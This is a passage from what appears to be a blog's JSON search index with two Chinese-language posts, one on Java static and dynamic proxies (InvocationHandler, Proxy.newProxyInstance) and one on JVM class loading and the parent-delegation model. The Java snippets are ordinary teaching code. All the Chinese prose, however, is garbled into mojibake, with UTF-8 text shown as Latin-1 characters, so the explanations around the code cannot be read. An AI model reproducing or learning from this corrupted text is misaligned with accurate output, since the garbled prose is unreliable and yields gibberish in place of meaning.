·çš„æ¥å£ï¼Œä»£ç†ç±»ä¸»è¦è´Ÿè´£ä¸ºå§”æ‰˜ç±»é¢„å¤„ç†æ¶ˆæ¯ã€è¿‡æ»¤æ¶ˆæ¯ã€æŠŠä¿¡æ¯è½¬å‘ç»™å§”æ‰˜ç±»ï¼Œä»¥åŠäº‹åå¤„ç†æ¶ˆæ¯ç­‰ã€‚\nä»£ç†ç±»ä¸å§”æ‰˜ç±»ä¹‹é—´é€šå¸¸ä¼šå­˜åœ¨å…³è”å…³ç³»ï¼Œä¸€ä¸ªä»£ç†ç±»å¯¹è±¡ä¸ä¸€ä¸ªå§”æ‰˜ç±»å¯¹è±¡å…³è”ï¼Œä»£ç†ç±»å¯¹è±¡æœ¬èº«å¹¶ä¸çœŸæ­£å®ç°æœåŠ¡ï¼Œè€Œæ˜¯é€šè¿‡å§”æ‰˜ç±»å¯¹è±¡çš„ç›¸å…³æ–¹æ³•æ¥æä¾›ç‰¹å®šæœåŠ¡ã€‚\né™æ€ä»£ç† éœ€è¦ä»£ç†å¯¹è±¡å’Œç›®æ ‡å¯¹è±¡å®ç°åŒæ ·çš„æ¥å£ã€‚\n**ç¼ºç‚¹ï¼š**å½“éœ€è¦çš„ä»£ç†çš„å¯¹è±¡è¿‡å¤šå°±éœ€è¦å®ç°å¤§é‡çš„ä»£ç†ç±»ï¼Œå¹¶ä¸”å½“æ¥å£å¢åŠ æ–¹æ³•ï¼Œç›®æ ‡å¯¹è±¡ä¸ä»£ç†å¯¹è±¡éƒ½è¦è¿›è¡Œä¿®æ”¹\nç›´æ¥ç”¨å‚è€ƒæ–‡ç« çš„ä¸€ä¸ªdemoæ¥æ¼”ç¤ºä¸€ä¸‹ä»€ä¹ˆæ˜¯é™æ€ä»£ç†ï¼Œç†è§£ä¸€ä¸‹\nEvent.java:\n1 2 3 4 5 6 //æ¥å£ç±» package java_foundation; public interface Event { void sale(); } Text.java\n1 2 3 4 5 6 7 8 //å§”æ‰˜ç±» package java_foundation; public class Text implements Event { public void sale(){ System.out.println(\u0026#34;è¦å–æˆ¿å­äº†\u0026#34;); } } MyTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 //ä»£ç†ç±» package java_foundation; public class MyTest implements Event{ private Event instances; public MyTest(Event a){ this.instances = a; } public void sale(){ instances.sale(); System.out.println(\u0026#34;å”®ä»·2000å…ƒ\u0026#34;); } } æœ€ç»ˆçš„æµ‹è¯•ç±»ï¼šTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 //æµ‹è¯•ç±» package java_foundation; public class Main{ public static void main(String[] args) throws Exception{ System.out.println(\u0026#34;======ä½¿ç”¨ä»£ç†å‰====\u0026#34;); Text a = new Text(); a.sale(); System.out.println(\u0026#34;======ä½¿ç”¨ä»£ç†å====\u0026#34;); MyTest b = new MyTest(new Text()); b.sale(); } } åªè¦ææ¸…æ¥šå¯¹è±¡çš„å…³ç³»ï¼Œè¿™é‡Œçš„ä»£ç å°±ä¸éš¾ç†è§£äº†ã€‚æœ€åç»“æœå¦‚ä¸‹ï¼š\n1 2 3 4 5 ======ä½¿ç”¨ä»£ç†å‰==== è¦å–æˆ¿å­äº† ======ä½¿ç”¨ä»£ç†å==== è¦å–æˆ¿å­äº† å”®ä»·2000å…ƒ ä¹Ÿå°±æ˜¯å¯ä»¥å°†ä»£ç†è®¾æƒ³ä¸ºè¿™é‡Œå–æˆ¿å­çš„ä¸­ä»‹ï¼Œä¸­ä»‹æ¥ç»™ä½ å®šä¹‰å…·ä½“çš„å†…å®¹ï¼Œä½ åªéœ€è¦æŠŠå¤§ä½“çš„è¯´æ˜å°±è¡Œäº†ã€‚\næˆ‘ä»¬è¿™é‡Œæ˜¯ç”¨çš„æ¥å£ç±»ä½œä¸ºæ¥æ”¶å‚æ•°çš„ç±»å‹ï¼Œå¹¶ä¸”æ„é€ å‡½æ•°çš„æ¥æ”¶çš„å‚æ•°ç±»å‹ä¹Ÿéƒ½æ˜¯æ¥å£ç±»å‹ã€‚\næœ‰ä¸€ä¸ªç‚¹è¯´æ˜ä¸€ä¸‹ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆè¿™é‡Œè¦ä½¿ç”¨Eventæ¥å£ç±»å‹ä½œä¸ºåª’ä»‹å‘¢ï¼Œåº”è¯¥æ˜¯å› ä¸ºå§”æ‰˜ç±»å®ç°äº†Eventæ¥å£ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿å¾—ç›¸åº”çš„Text()å¯¹è±¡å¯ä»¥æˆä¸ºè¿™ä¸ªç±»å‹ï¼ŒåŒæ—¶ä»£ç†ç±»MyTestä¹Ÿæ¥å£äº†Eventæ¥å£ï¼Œæ‰€ä»¥MyTestç±»ä¹Ÿå¯ä»¥æ¥å—Eventç±»å‹çš„æ•°æ®ã€‚\nè¿™é‡Œæœ€é‡è¦çš„å®ç°ä»£ç†çš„æ“ä½œå°±æ˜¯ä»£ç†ç±»ä¸­çš„å¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 public void sale(){ instances.sale(); System.out.println(\u0026#34;å”®ä»·2000å…ƒ\u0026#34;); } å°±æ˜¯å› ä¸ºè¿™ä¸²ä»£ç å¯¼è‡´çš„æœ€ç»ˆè¾“å‡ºä¸º\n1 2 è¦å–æˆ¿å­äº† å”®ä»·2000å…ƒ å› ä¸ºæˆ‘ä»¬newåå°†instanceå¯¹åº”åˆ°äº†å§”æ‰˜ç±»çš„å¯¹è±¡ï¼Œæ­¤æ—¶å°±ä¼šè°ƒç”¨Text.javaä¸­çš„sale()æ–¹æ³•ï¼Œæ‰€ä»¥å…¶å®ä¸€èˆ¬ä»£ç†ç±»çš„é‡è¦ä»£ç éƒ½ä¼šè°ƒç”¨ä¸¤æ¬¡ã€‚ç®€å•æµç¨‹å›¾å¦‚ä¸‹\nåŠ¨æ€ä»£ç† ä¸é™æ€ä»£ç†ç›¸åŒï¼Œéœ€è¦å…¬å…±æ¥å£ï¼Œå§”æ‰˜ç±»ï¼Œä»£ç†ç±»ã€‚åŒºåˆ«å°±æ˜¯åŠ¨æ€ä»£ç†æ˜¯åˆ©ç”¨åå°„æœºåˆ¶åœ¨è¿è¡Œæ—¶åˆ›å»ºä»£ç†ç±»ã€‚è¿™é‡Œéœ€è¦ç”¨åˆ°ä½äºJava.lang.reflectä¸‹çš„Proxyç±»ä¸InvocationHandleræ¥å£ã€‚\nInvocationHandleræ¥å£ï¼šè´Ÿè´£æä¾›è°ƒç”¨ä»£ç†çš„æ“ä½œ 1 2 3 4 public interface InvocationHandler { public Object invoke(Object proxy, Method method, Object[] args) throws Throwable; } å…¶ä¸­proxyä¸ºä»£ç†ç±»çš„å®ä¾‹å¯¹è±¡ï¼Œmethodè¡¨ç¤ºè°ƒç”¨çš„æ–¹æ³•åï¼Œargs[]ä¸ºè°ƒç”¨æ–¹æ³•çš„å‚æ•°æ•°ç»„\nè¿™ä¸ªæ¥å£å®šä¹‰äº†ä¸€ä¸ªinvoke()æ–¹æ³•ï¼Œæ¯ä¸ªä»£ç†å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªå…³è”çš„æ¥å£ã€‚è¿™ä¸ªæ˜¯å¾ˆé‡è¦çš„ï¼šå½“ä»£ç†å¯¹è±¡ä¸Šè°ƒç”¨ä»»æ„æ–¹æ³•æ—¶ï¼Œè¯¥æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è½¬å‘åˆ°InvocationHandler.invoke()æ–¹æ³•è¿›è¡Œè°ƒç”¨\nProxyç±»ï¼šè´Ÿè´£åŠ¨æ€æ„å»ºä»£ç†ç±» ä½äºjava.lang.reflect.Proxyï¼Œæä¾›äº†é™æ€æ–¹æ³•ç”¨äºå¾—åˆ°ä»£ç†å¯¹è±¡\n1 public static Object newProxyInstance(ClassLoader loader,Class\u0026lt;?\u0026gt;[] interfaces,InvocationHandler h)throws IllegalArgumentException{} ç»§ç»­ä½¿ç”¨å‰é¢çš„é‚£ä¸ªä¾‹å­ï¼Œç»“åˆä»£ç ï¼Œæˆ‘ä»¬è¿™é‡Œéœ€è¦è·å¾—ç±»åŠ è½½å™¨ï¼Œç›¸å¯¹åº”çš„æ–¹æ³•ï¼Œç›´æ¥ç»™ä»£ç ï¼š\nå§”æ‰˜ç±»å’Œæ¥å£ä¸å˜ï¼Œ\nText.java:\n1 2 3 4 5 6 7 8 //å§”æ‰˜ç±» package java_foundation; public class Text implements Event { public void sale(){ System.out.println(\u0026#34;è¦å–æˆ¿å­äº†\u0026#34;); } } Event.javaï¼š\n1 2 3 4 5 6 //æ¥å£ç±» package java_foundation; public interface Event { void sale(); } çœ‹å…¶ä»–éœ€è¦ä¿®æ”¹çš„ä»£ç ï¼š\nMyTest.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 //åŠ¨æ€è·å–ä»£ç†çš„ä»£ç†ç±» package java_foundation; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; public class MyTest implements InvocationHandler{ private Object instances; public MyTest(Object a){ this.instances = a; } //é‡å†™invoke()æ–¹æ³• public Object invoke(Object proxy, Method method, Object[] args) throws Throwable{ System.out.println(\u0026#34;å”®ä»·2000å…ƒ\u0026#34;); Object result = method.invoke(instances,args); return result; } } åœ¨è¿™ä¸ªä»£ç†ç±»é‡å†™çš„invoke()æ–¹æ³•ä¸­ï¼Œçœ‹åˆ°äº†å¾ˆç†Ÿæ‚‰çš„æ“ä½œï¼Œè°ƒç”¨æ–¹æ³•ï¼Œå¯¹ï¼Œå°±æ˜¯è°ƒç”¨äº†invoke()æ–¹æ³•ï¼Œç»“åˆåœ¨å‰é¢è¯´æ˜InvocationHandleræ¥å£ç±»æ—¶ï¼Œå¤§æ¦‚ä¹…èƒ½çŸ¥é“è¿™é‡Œçš„è°ƒç”¨é€»è¾‘ã€‚åé¢çœ‹äº†ç»“æœå°±çŸ¥é“äº†ã€‚\nMain.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 //æµ‹è¯•ç±» package java_foundation; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; public class Main{ public static void main(String[] args) throws Exception{ //è·å–å§”æ‰˜ç±»çš„å®ä¾‹å¯¹è±¡ Text text = new Text(); //è·å–CalssLoader ClassLoader classLoader = text.getClass().getClassLoader(); //è·å–æ‰€æœ‰æ¥å£ Class[] interfaces = text.getClass().getInterfaces(); //è·å–ä¸€ä¸ªè°ƒç”¨å¤„ç†å™¨ InvocationHandler invocatinoHandler = new MyTest(text); //åˆ›å»ºä»£ç†å¯¹è±¡ Event proxy = (Event)Proxy.newProxyInstance(classLoader,interfaces,invocatinoHandler); proxy.sale(); } } æˆåŠŸè¾“å‡º\n1 2 å”®ä»·2000å…ƒ è¦å–æˆ¿å­äº† å¤§æ¦‚å°±æ˜¯è¿™è¿™æ ·ï¼Œå…¶å®ç†è§£ä¸€ä¸‹å°±è¡Œäº†ï¼Œéš¾åº¦ä¸æ˜¯å¾ˆé«˜ï¼Œé‡ç‚¹å…³æ³¨invoke()ä¸­çš„ä»£ç ã€‚\nï¼ˆå‚è€ƒæ–‡ç« æœ‰ä¸€é“é¢˜ï¼Œåé¢å¯ä»¥å­¦ä¹ ä¸€ä¸‹ï¼‰\nå‚è€ƒæ–‡ç« ï¼š\nhttps://xz.aliyun.com/t/9197?time__1311=n4%2BxuDgD9DyDnB7QGQD%2FD0WoQ4D55i%3D31YNGt4D\nhttps://blog.csdn.net/DDDYSz/article/details/109451049\nhttps://tttang.com/archive/1769/\nhttps://www.cnblogs.com/whirly/p/10154887.html\n","date":"2025-01-22T12:57:32+08:00","permalink":"https://fupanc-w1n.github.io/p/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/","title":"JavaåŠ¨æ€ä»£ç†"},{"content":"Javaç±»åŠ è½½æœºåˆ¶ JVMï¼ˆjavaè™šæ‹Ÿæœºï¼‰æŠŠæè¿°ç±»çš„æ•°æ®ä»Classæ–‡ä»¶åŠ è½½åˆ°å†…å­˜ï¼Œå¹¶å¯¹æ•°æ®è¿›è¡Œæ ¡éªŒã€è§£æå’Œåˆå§‹åŒ–ï¼Œæœ€ç»ˆå½¢æˆå¯ä»¥è¢«è™šæ‹Ÿæœºç›´æ¥ä½¿ç”¨çš„Javaç±»å‹ï¼Œè¿™å°±æ˜¯è™šæ‹Ÿæœºçš„ç±»åŠ è½½æœºåˆ¶ã€‚\nJavaç±» Javaæ˜¯ç¼–è¯‘å‹è¯­è¨€ï¼Œæˆ‘ä»¬ç¼–å†™çš„javaæ–‡ä»¶éœ€è¦è¢«ç¼–è¯‘æˆclassæ–‡ä»¶åæ‰èƒ½è¢«JVMè¿è¡Œï¼Œè¿™é‡Œå…ˆäº†è§£ä¸€ä¸‹javaç±»ã€‚\nç»™ä¸€ä¸ªMain.javaï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n1 2 3 4 5 public class Main{ public static void main(String[] args){ System.out.println(\u0026#34;haha\u0026#34;); } } ä½¿ç”¨javacå‘½ä»¤å°†å…¶ç¼–è¯‘ä¸ºå­—èŠ‚ä»£ç çš„classæ–‡ä»¶ï¼Œç»“æœå¦‚ä¸‹ï¼š\nè¿™æ ·å°±ç”Ÿæˆäº†ä¸€ä¸ªå­—èŠ‚ç æ–‡ä»¶ ï¼Œç”¨åå…­è¿›åˆ¶å·¥å…·æ‰“å¼€çœ‹ä¸€ä¸‹\nè¿™é‡Œå°±å¯ä»¥çœ‹åˆ°ç”Ÿæˆçš„å­—èŠ‚ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡JDKè‡ªå¸¦çš„javapå‘½ä»¤åæ±‡ç¼–Main.classæ–‡ä»¶å¯¹åº”çš„Mainç±»ï¼Œ\nJVMåœ¨æ‰§è¡ŒMainä¹‹å‰ä¼šå…ˆè§£æclassäºŒè¿›åˆ¶å†…å®¹ï¼ŒJVMæ‰§è¡Œçš„å…¶å®å°±æ˜¯å¦‚ä¸Šjavapå‘½ä»¤ç”Ÿæˆçš„å­—èŠ‚ç ã€‚\nç±»åŠ è½½çš„æ—¶æœº ï¼ˆå…·ä½“å¯å‚è€ƒã€Šæ·±å…¥ç†è§£Javaè™šæ‹Ÿæœºã€‹ä¸€ä¹¦ï¼‰\nç±»åŠ è½½è¿‡ç¨‹å¦‚ä¸‹è¡¨ç¤ºï¼š\nå…¶ä¸­ ä»éªŒè¯åˆ°è§£æ ä¸ºè¿æ¥ï¼Œ ä»åŠ è½½åˆ°åˆå§‹åŒ– ä¸ºç±»åŠ è½½\nåŠ è½½ åŠ è½½è¿‡ç¨‹ï¼š\né€šè¿‡ç±»çš„å…¨é™å®šåï¼ˆåŒ…å+ç±»åï¼‰æ¥è·å–å®šä¹‰æ­¤ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµ å°†è¿™ä¸ªå­—èŠ‚æµæ‰€ä»£è¡¨çš„é™æ€å­˜å‚¨ç»“æ„è½¬åŒ–ä¸ºè¿è¡Œæ—¶çš„æ•°æ®ç»“æœ åœ¨å†…å­˜ä¸­ç”Ÿæˆä¸€ä¸ªä»£è¡¨è¿™ä¸ªç±»çš„java.lang.Classå¯¹è±¡ï¼Œä½œä¸ºæ–¹æ³•åŒºè¿™ä¸ªç±»çš„å„ç§æ•°æ®çš„è®¿é—®å…¥å£ æ ¡éªŒ è¿™ä¸€é˜¶æ®µçš„ç›®çš„æ˜¯ä¸ºäº†ç¡®ä¿Classæ–‡ä»¶çš„å­—èŠ‚æµä¸­åŒ…å«çš„ä¿¡æ¯ç¬¦åˆå½“å‰è™šæ‹Ÿæœºçš„è¦æ±‚ï¼Œå¹¶ä¸”ä¸ä¼šå±å®³è™šæ‹Ÿæœºè‡ªèº«çš„å®‰å…¨ã€‚ä»æ•´ä½“ä¸Šçœ‹ï¼ŒéªŒè¯é˜¶æ®µå¤§è‡´ä¸Šä¼šå®Œæˆ4ä¸ªé˜¶æ®µçš„æ ¡éªŒå·¥ä½œï¼šæ–‡ä»¶æ ¼å¼ã€å…ƒæ•°æ®ã€å­—èŠ‚ç ã€ç¬¦å·å¼•ç”¨ã€‚å¯ä»¥é€šè¿‡è®¾ç½®å‚æ•°ç•¥è¿‡ã€‚\nå‡†å¤‡ å‡†å¤‡é˜¶æ®µæ˜¯æ­£å¼ä¸ºç±»ä¸­å®šä¹‰çš„å˜é‡ï¼ˆå³é™æ€å˜é‡\u0026ndash;è¢«staticä¿®é¥°çš„å˜é‡ï¼‰åˆ†é…å†…å­˜å¹¶è®¾ç½®ç±»å˜é‡åˆå§‹å€¼çš„é˜¶æ®µã€‚\nè¿™é‡Œéœ€è¦æ³¨æ„çš„ç‚¹ï¼š\næ­¤æ—¶è¿›è¡Œå†…å­˜åˆ†é…çš„ä»…åŒ…æ‹¬ç±»å˜é‡ï¼ˆé™æ€å˜é‡ï¼‰ï¼Œè€Œä¸åŒ…æ‹¬å®ä¾‹å˜é‡ï¼Œå®ä¾‹å˜é‡å°†ä¼šåœ¨å¯¹è±¡å®ä¾‹åŒ–æ—¶éšç€å¯¹è±¡ä¸€èµ·åˆ†é…åœ¨Javaå †ä¸­ã€‚ ä¹Ÿå°±æ˜¯è¯´ç±»å˜é‡éšç€ç±»çš„åŠ è½½ä¸ºå­˜åœ¨äºæ–¹æ³•åŒº\nå…¶æ¬¡å°±æ˜¯è¿™é‡Œè¯´çš„åˆå§‹å€¼â€œé€šå¸¸æƒ…å†µâ€ä¸‹æ˜¯æ•°æ®ç±»å‹çš„é›¶å€¼ï¼Œæ¯”å¦‚å¦‚ä¸‹ä»£ç ï¼š public satic int value = 123;ï¼Œåœ¨å‡†å¤‡é˜¶æ®µè¿‡åçš„åˆå§‹å€¼ä¸º0è€Œä¸æ˜¯123ã€‚æŠŠvalueèµ‹å€¼ä¸º123çš„æŒ‡ä»¤åœ¨åˆå§‹åŒ–é˜¶æ®µæ‰ä¼šè¢«æ‰§è¡Œã€‚\nä½†æ˜¯åœ¨ä¸€äº›ç‰¹æ®Šæƒ…å†µï¼Œå¦‚æœç±»å˜é‡åŒæ—¶è¢«staticå’Œfinalä¿®é¥°ï¼Œæ¯”å¦‚ï¼š\npublic static final int value = 123;\né‚£ä¹ˆåœ¨å‡†å¤‡é˜¶æ®µè™šæ‹Ÿæœºå°±ä¼šå°†valueèµ‹å€¼ä¸º123ï¼Œå¹¶ä¸”åœ¨å®šä¹‰è¿™ä¸ªå˜é‡çš„æ—¶å€™å¿…é¡»ä¸ºå…¶æ˜¾å¼çš„èµ‹å€¼ã€‚\nè§£æ è§£æé˜¶æ®µæ˜¯Javaè™šæ‹Ÿæœºå°†å¸¸é‡æ± å†…çš„ç¬¦å·å¼•ç”¨æ›¿æ¢ä¸ºç›´æ¥å¼•ç”¨çš„è¿‡ç¨‹\nç¬¦å·å¼•ç”¨å°±æ˜¯ä¸€ç»„ç¬¦å·æ¥æè¿°ç›®æ ‡ï¼Œå¯ä»¥æ˜¯ä»»ä½•å­—é¢é‡ã€‚ ç›´æ¥å¼•ç”¨å°±æ˜¯ç›´æ¥æŒ‡å‘ç›®æ ‡çš„æŒ‡é’ˆã€ç›¸å¯¹åç§»é‡æˆ–ä¸€ä¸ªé—´æ¥å®šä½åˆ°ç›®æ ‡çš„å¥æŸ„ã€‚ åˆå§‹åŒ– æ‰§è¡Œç±»æ„é€ å™¨\u0026lt;clinit\u0026gt;()æ–¹æ³•çš„è¿‡ç¨‹\nä¼šè°ƒç”¨java.lang.ClassLoaderåŠ è½½ç±»å­—èŠ‚ç ï¼ŒClassLoaderä¼šè°ƒç”¨JVMçš„nativeæ–¹æ³•ï¼ˆdefineClass0/1/2ï¼‰æ¥å®šä¹‰ä¸€ä¸ªjava.lang.Class å®ä¾‹\nå…¶ä¸­åŒ…æ‹¬ï¼š\næ‰§è¡Œstaticè¯­å¥å—ä¸­çš„è¯­å¥ å®Œæˆstaticå±æ€§çš„èµ‹å€¼æ“ä½œ å½“ç±»çš„ç›´æ¥çˆ¶ç±»è¿˜æ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œåˆ™å…ˆåˆå§‹åŒ–å…¶ç›´æ¥çˆ¶ç±» ClassLoaderç±»åŠ è½½å™¨åˆ†ç±» ä¸€åˆ‡çš„Javaç±»éƒ½å¿…é¡»ç»è¿‡JVMåŠ è½½åæ‰èƒ½è¿è¡Œï¼Œè€ŒClassLoaderçš„ä¸»è¦ä½œç”¨å°±æ˜¯Javaç±»æ–‡ä»¶çš„åŠ è½½ã€‚\nç±»åŠ è½½å™¨ç±»å‹åŒ…æ‹¬å››ç§ï¼Œåˆ†åˆ«å¦‚ä¸‹ï¼š\nBootstrap ClassLoaderï¼ˆå¯åŠ¨ç±»åŠ è½½å™¨ï¼‰ï¼šæœ€é¡¶å±‚çš„ç±»åŠ è½½å™¨ï¼Œä¸»è¦åŠ è½½æ ¸å¿ƒç±»åº“ã€‚è¿™ä¸ªç±»åŠ è½½å™¨è´Ÿè´£åŠ è½½å­˜æ”¾åœ¨ jre\\lib ç›®å½•ä¸‹çš„éƒ¨åˆ†jaråŒ…ï¼ˆå¦‚rt.jarã€tools.jarï¼‰æˆ–è€…è¢«-Xbootclasspath å‚æ•°æ‰€æŒ‡å®šçš„è·¯å¾„ä¸­å­˜æ”¾çš„ç±»åº“ã€‚ Extension ClassLoaderï¼ˆæ‰©å±•ç±»åŠ è½½å™¨ï¼‰ï¼šè¿™ä¸ªåŠ è½½å™¨ç”±sun.misc.Launcher$ExtClassLoaderå®ç°ï¼Œå®ƒè´Ÿè´£åŠ è½½ jre\\lib\\ext ç›®å½•ä¸­çš„ï¼Œæˆ–è€…è¢« java.ext.dirs ç³»ç»Ÿå˜é‡æ‰€æŒ‡å®šçš„è·¯å¾„ä¸­çš„æ‰€æœ‰ç±»åº“ Application ClassLoaderï¼ˆç³»ç»Ÿç±»åŠ è½½å™¨ï¼‰ï¼šè¿™ä¸ªç±»åŠ è½½å™¨ç”± sun.misc.Launcher$AppClassLoader å®ç°ã€‚å®ƒè´Ÿè´£åŠ è½½ç”¨æˆ·ç±»è·¯å¾„ï¼ˆClassPathï¼‰ä¸Šæ‰€æŒ‡å®šçš„ç±»åº“ã€‚éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœåº”ç”¨ç¨‹åºä¸­æ²¡æœ‰è‡ªå®šä¹‰è‡ªå·±çš„ç±»åŠ è½½å™¨ï¼Œä¸€èˆ¬æƒ…å†µä¸‹AppClassLoaderæ˜¯é»˜è®¤çš„ç±»åŠ è½½å™¨ã€‚ ç”¨æˆ·è‡ªå®šä¹‰åŠ è½½å™¨ åœ¨Javaè™šæ‹Ÿæœºè§’åº¦æ¥çœ‹ï¼Œå­˜åœ¨ä¸¤ç§ä¸åŒçš„ç±»åŠ è½½å™¨ï¼š\nä¸€ç§æ˜¯å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œè¿™ä¸ªåŠ è½½å™¨ä½¿ç”¨C++è¯­è¨€å®ç°ï¼Œæ˜¯è™šæ‹Ÿæœºè‡ªèº«çš„ä¸€éƒ¨åˆ†ã€‚æ‰€ä»¥å½“ä½¿ç”¨getClassLoader()æ–¹æ³•æ—¶ä¼šè¿”å›nullï¼ˆåé¢ä¼šè¯´ï¼‰\nè¿˜æœ‰ä¸€ç§æ˜¯å…¶ä»–æ‰€æœ‰çš„ç±»åŠ è½½å™¨ï¼Œè¿™äº›ç±»åŠ è½½å™¨éƒ½ç”±Javaè¯­è¨€å®ç°ï¼Œç‹¬ç«‹å­˜åœ¨äºè™šæ‹Ÿæœºå¤–éƒ¨ï¼Œå¹¶ä¸”å…¨éƒ½ç»§æ‰¿è‡ªæŠ½è±¡ç±» java.lang.ClassLoaderã€‚\nè·å–ç±»åŠ è½½å™¨çš„æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import java.lang.ClassLoader; public class Main { public static void main(String[] args) throws Exception { // è·å– Test ç±»çš„ç±»åŠ è½½å™¨ ClassLoader testClassLoader = Class.forName(\u0026#34;Test\u0026#34;).getClassLoader(); System.out.println(\u0026#34;Test ç±»çš„ç±»åŠ è½½å™¨: \u0026#34; + testClassLoader); // è·å–å½“å‰ç±»çš„ç±»åŠ è½½å™¨ ClassLoader currentClassLoader = Main.class.getClassLoader(); System.out.println(\u0026#34;Main ç±»çš„ç±»åŠ è½½å™¨: \u0026#34; + currentClassLoader); // è·å–ç³»ç»Ÿç±»åŠ è½½å™¨ ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader(); System.out.println(\u0026#34;ç³»ç»Ÿç±»åŠ è½½å™¨: \u0026#34; + systemClassLoader); } } /* Output: Test ç±»çš„ç±»åŠ è½½å™¨: sun.misc.Launcher$AppClassLoader@18b4aac2 Main ç±»çš„ç±»åŠ è½½å™¨: sun.misc.Launcher$AppClassLoader@18b4aac2 ç³»ç»Ÿç±»åŠ è½½å™¨: sun.misc.Launcher$AppClassLoader@18b4aac2 åŒäº²å§”æ´¾æ¨¡å‹ åŒäº²å§”æ´¾æ¨¡å‹è¦æ±‚é™¤äº†é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨å¤–ï¼Œå…¶ä½™çš„ç±»åŠ è½½å™¨éƒ½åº”æœ‰è‡ªå·±çš„çˆ¶ç±»åŠ è½½å™¨ã€‚æ³¨æ„è¿™é‡Œçš„çˆ¶å­å…³ç³»ä¸€èˆ¬ä¸æ˜¯ä»¥ç»§æ‰¿å…³ç³»å®ç°ï¼Œåªæ˜¯é€šè¿‡ä½¿ç”¨ç»„åˆå…³ç³»æ¥å¤ç”¨çˆ¶åŠ è½½å™¨çš„ä»£ç ã€‚\nåŒäº²å§”æ´¾æ¨¡å‹çš„å·¥ä½œæµç¨‹å›¾\nå³å¦‚æœä¸€ä¸ªç±»åŠ è½½å™¨æ”¶åˆ°äº†ç±»åŠ è½½çš„è¯·æ±‚ï¼Œå®ƒä¸ä¼šè‡ªå·±å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œè€Œæ˜¯æŠŠè¿™ä¸ªè¯·æ±‚å§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨å»å®Œæˆï¼Œæ¯ä¸€å±‚æ¬¡çš„åŠ è½½å™¨éƒ½æ˜¯å¦‚æ­¤ï¼Œç›´åˆ°ä¼ é€åˆ°æœ€é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œåªæœ‰å½“çˆ¶åŠ è½½å™¨åé¦ˆè‡ªå·±æ— æ³•å®Œæˆè¿™ä¸ªåŠ è½½è¯·æ±‚çš„æ—¶å€™ï¼ˆå³å®ƒçš„æœç´¢èŒƒå›´ä¸­æ²¡æœ‰æ‰¾åˆ°æ‰€éœ€çš„ç±»ï¼‰æ—¶ï¼Œå­åŠ è½½å™¨æ‰ä¼šå°è¯•è‡ªå·±å»å®ŒæˆåŠ è½½ã€‚\nåŒäº²å§”æ´¾æ¨¡å‹çš„ä¼˜ç‚¹ï¼š\n1ã€è¿™æ ·å°±æ˜¯èƒ½å¤Ÿå®ç°æœ‰äº›ç±»é¿å…é‡å¤åŠ è½½ä½¿ç”¨ï¼Œç›´æ¥å…ˆç»™çˆ¶åŠ è½½å™¨åŠ è½½ï¼Œä¸ç”¨å­åŠ è½½å™¨å†æ¬¡é‡å¤åŠ è½½ã€‚\n2ã€ä¿è¯javaæ ¸å¿ƒåº“çš„ç±»å‹å®‰å…¨ã€‚æ¯”å¦‚ç½‘ç»œä¸Šä¼ è¾“äº†ä¸€ä¸ªjava.lang.Objectç±»ï¼Œé€šè¿‡åŒäº²æ¨¡å¼ä¼ é€’åˆ°å¯åŠ¨ç±»å½“ä¸­ï¼Œç„¶åå‘ç°å…¶Objectç±»æ—©å·²è¢«åŠ è½½è¿‡ï¼Œæ‰€ä»¥å°±ä¸ä¼šåŠ è½½è¿™ä¸ªç½‘ç»œä¼ è¾“è¿‡æ¥çš„java.lang.Objectç±»ï¼Œä¿è¯æˆ‘ä»¬çš„javaæ ¸å¿ƒAPIåº“ä¸è¢«ç¯¡æ”¹ï¼Œå‡ºç°ç±»ä¼¼ç”¨æˆ·è‡ªå®šä¹‰java.lang.Objectç±»çš„æƒ…å†µã€‚\nåŒäº²å§”æ´¾æ¨¡å‹å®ç°ä»£ç \nè¿™æ®µä»£ç çš„é€»è¾‘å°±æ˜¯å…ˆæ£€æŸ¥è¯·æ±‚åŠ è½½çš„ç±»å‹æ˜¯å¦è¢«åŠ è½½è¿‡ï¼Œå¦‚æœæ²¡æœ‰å°±è°ƒç”¨çˆ¶åŠ è½½å™¨çš„loadClass() æ–¹æ³•ï¼Œè‹¥çˆ¶åŠ è½½å™¨ä¸ºç©ºåˆ™é»˜è®¤ä½¿ç”¨å¯åŠ¨ç±»åŠ è½½å™¨ä¸ºçˆ¶åŠ è½½å™¨ã€‚å‡å¦‚çˆ¶åŠ è½½å™¨åŠ è½½å¤±è´¥ï¼Œæ‰è°ƒç”¨è‡ªå·±çš„findClass()æ–¹æ³•åŠ è½½ã€‚\næœ€åé€šè¿‡ä¸Šè¿°æ­¥éª¤æˆ‘ä»¬æ‰¾åˆ°äº†å¯¹åº”çš„ç±»ï¼Œå¹¶ä¸”æ¥æ”¶åˆ°çš„resolveå‚æ•°çš„å€¼ä¸ºtrue,é‚£ä¹ˆå°±ä¼šè°ƒç”¨resolveClass(Class)æ–¹æ³•æ¥å¤„ç†ç±»ã€‚\n//ç±»åŠ è½½å™¨æ ¸å¿ƒæ–¹æ³• loadClassï¼šåŠ 